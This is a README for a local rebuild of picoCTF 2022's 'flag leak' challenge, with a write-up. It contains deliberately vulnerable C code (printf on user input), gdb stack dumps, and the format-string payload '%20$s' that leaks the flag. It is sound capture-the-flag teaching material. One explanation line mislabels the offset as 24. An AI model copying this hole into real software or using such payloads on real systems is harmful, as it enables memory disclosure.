# Format_String
local compile version of the 'flag leak' challenge - picoCTF 2022

## How to use
- Step 1: Run command ```docker build . -t chall:1``` to build the challenge
- Step 2: Run command ```docker run --rm -it chall:1``` to run the challange

## Write up
- First let's checkout the source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Nói gì đi rồi tui nói lại cho >> ");
   scanf("%127s", story);
   printf("Đến lượt tui nè: \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  pid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
- Checksec:
```c
mera@Admin:/mnt/d/LTAT$ checksec chall
[*] '/mnt/d/LTAT/chall'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

- No PIE enable. Easily see the format-string-vulnerability on vuln function by calling to printf(story) without any format string arguments
- Step 1: Check the FLAG frame in stack
``` assembly
(gdb) diassemble vuln
Undefined command: "diassemble".  Try "help".
(gdb) disassemble vuln
Dump of assembler code for function _Z4vulnv:
   0x0804927f <+0>:     push   %ebp
   0x08049280 <+1>:     mov    %esp,%ebp
   0x08049282 <+3>:     push   %ebx
   0x08049283 <+4>:     sub    $0xc4,%esp
   0x08049289 <+10>:    call   0x8049140 <__x86.get_pc_thunk.bx>
   0x0804928e <+15>:    add    $0x2d72,%ebx
   0x08049294 <+21>:    sub    $0x8,%esp
   0x08049297 <+24>:    push   $0x40
   0x08049299 <+26>:    lea    -0x48(%ebp),%eax
   0x0804929c <+29>:    push   %eax
   0x0804929d <+30>:    call   0x8049206 <_Z8readflagPcj>
   0x080492a2 <+35>:    add    $0x10,%esp
   0x080492a5 <+38>:    sub    $0xc,%esp
   0x080492a8 <+41>:    lea    -0x1f9c(%ebx),%eax
   0x080492ae <+47>:    push   %eax
   0x080492af <+48>:    call   0x8049050 <printf@plt>
   0x080492b4 <+53>:    add    $0x10,%esp
   0x080492b7 <+56>:    sub    $0x8,%esp
   0x080492ba <+59>:    lea    -0xc8(%ebp),%eax
   0x080492c0 <+65>:    push   %eax
   0x080492c1 <+66>:    lea    -0x1f6d(%ebx),%eax
   0x080492c7 <+72>:    push   %eax
   0x080492c8 <+73>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x080492cd <+78>:    add    $0x10,%esp
   0x080492d0 <+81>:    sub    $0xc,%esp
   0x080492d3 <+84>:    lea    -0x1f67(%ebx),%eax
   0x080492d9 <+90>:    push   %eax
   0x080492da <+91>:    call   0x8049080 <puts@plt>
   0x080492df <+96>:    add    $0x10,%esp
   0x080492e2 <+99>:    sub    $0xc,%esp
   0x080492e5 <+102>:   lea    -0xc8(%ebp),%eax
--Type <RET> for more, q to quit, c to continue without paging--
   0x080492eb <+108>:   push   %eax
   0x080492ec <+109>:   call   0x8049050 <printf@plt>
   0x080492f1 <+114>:   add    $0x10,%esp
   0x080492f4 <+117>:   sub    $0xc,%esp
   0x080492f7 <+120>:   push   $0xa
   0x080492f9 <+122>:   call   0x80490c0 <putchar@plt>
   0x080492fe <+127>:   add    $0x10,%esp
   0x08049301 <+130>:   nop
   0x08049302 <+131>:   mov    -0x4(%ebp),%ebx
   0x08049305 <+134>:   leave
   0x08049306 <+135>:   ret
```
- Break point at 0x080492a2
```assembly
Breakpoint 1, 0x080492a2 in vuln() ()
(gdb) x
Argument required (starting display address).
(gdb) x/100x $sp
0xffffd000:     0xffffd090      0x00000040      0xf7d86374      0x0804928e
0xffffd010:     0xf7fbe4a0      0xffffffff      0xffffd094      0xf7d81e54
0xffffd020:     0xf7fbe4a0      0xf7fd0294      0xf7d79674      0xf7f9a000
0xffffd030:     0xf7f9ada0      0x00000000      0x08048369      0x0804c034
0xffffd040:     0xf7ffda40      0xf7fd6f20      0x08048369      0xf7ffda40
```
- 0xffffd090 is FLAG address -> the stack frame of FLAG
- Continue breakpoint right the printf function (that print the story variable) at 0x080492ec
```assembly
Breakpoint 1, 0x080492ec in vuln() ()
(gdb)  x/100x $sp
0xffffd000:     0xffffd010      0xffffd010      0xf7d86374      0x0804928e
0xffffd010:     0xf7fb0061      0xffffffff      0xffffd094      0xf7d81e54
0xffffd020:     0xf7fbe4a0      0xf7fd0294      0xf7d79674      0xf7f9a000
0xffffd030:     0xf7f9ada0      0x00000000      0x08048369      0x0804c034
0xffffd040:     0xf7ffda40      0xf7fd6f20      0x08048369      0xf7ffda40
0xffffd050:     0xffffd090      0xf7ffdc0c      0xf7fbe7c0      0x00000001
```
OR can look like this:
```
+------------+------------------+
| Address    | Value            |
+------------+------------------+
| 0xffffd000 | 0xffffd010       | --> esp (address of 'story' variable - parameter of the printf function)
| 0xffffd004 | 0xffffd010       |  1
| 0xffffd008 | 0xf7d86374       |  2
| 0xffffd00c | 0x0804928e       |  3
+------------+------------------+
| 0xffffd010 | 0xf7fb0061       |  4
| 0xffffd014 | 0xffffffff       |  5
| 0xffffd018 | 0xffffd094       |  6
| 0xffffd01c | 0xf7d81e54       |  7
+------------+------------------+
| 0xffffd020 | 0xf7fbe4a0       |  8
| 0xffffd024 | 0xf7fd0294       |  9
| 0xffffd028 | 0xf7d79674       |  10
| 0xffffd02c | 0xf7f9a000       |  11
+------------+------------------+  
| 0xffffd030 | 0xf7f9ada0       |  12
| 0xffffd034 | 0x00000000       |  13
| 0xffffd038 | 0x08048369       |  14
| 0xffffd03c | 0x0804c034       |  15
+------------+------------------+
| 0xffffd040 | 0xf7ffda40       |  16
| 0xffffd044 | 0xf7fd6f20       |  17
| 0xffffd048 | 0x08048369       |  18
| 0xffffd04c | 0xf7ffda40       |  19
+------------+------------------+
| 0xffffd050 | 0xffffd090       |  20 --> Address of the flag
| 0xffffd054 | 0xf7ffdc0c       |
| 0xffffd058 | 0xf7fbe7c0       |
| 0xffffd05c | 0x00000001       |
+------------+------------------+
```
- From the current the stack frame that esp point to (0xffffd010) the stack frame of FLAG (0xffffd090) need 20 stack frame including the FLAG stackframe. So we can use this payload to leak the FLAG: "%20$s"
```c
% : This marks the beginning of a format specifier.
24 : This is a positional argument specifier. It means that printf should use the 20th argument in the list provided to it.
$ : This is used in conjunction with the positional argument specifier. It's what differentiates a positional argument specifier from a width specifier.
s : This indicates that the argument is expected to be a string (char *).
So, when you use %20$s in printf, the function will expect at least 20 arguments to be passed to it, and it will print the 20th argument assuming it's a string. If there are fewer than 20 arguments provided, or if the 20th argument is not a string, this will likely result in undefined behavior, such as a crash or printing garbage data, because printf will try to access memory that it shouldn't.

Here's a simple example:
printf("%20$s", arg1, arg2, ..., arg20); // arg20 should be a string

In this code, arg20 is expected to be a string, and it will be printed. This feature is not commonly used and can lead to confusing code, so it's generally recommended to use simpler format specifiers unless you have a specific need for this kind of functionality.
```
- FLAG:
```
mera@Admin:/mnt/d/LTAT$ ./chall
Nói gì đi rồi tui nói lại cho >> %20$s
Đến lượt tui nè:
CCDCTF{s33d_h@i_nhw_n@y_s33d_m0t_nhw_n@0}
```




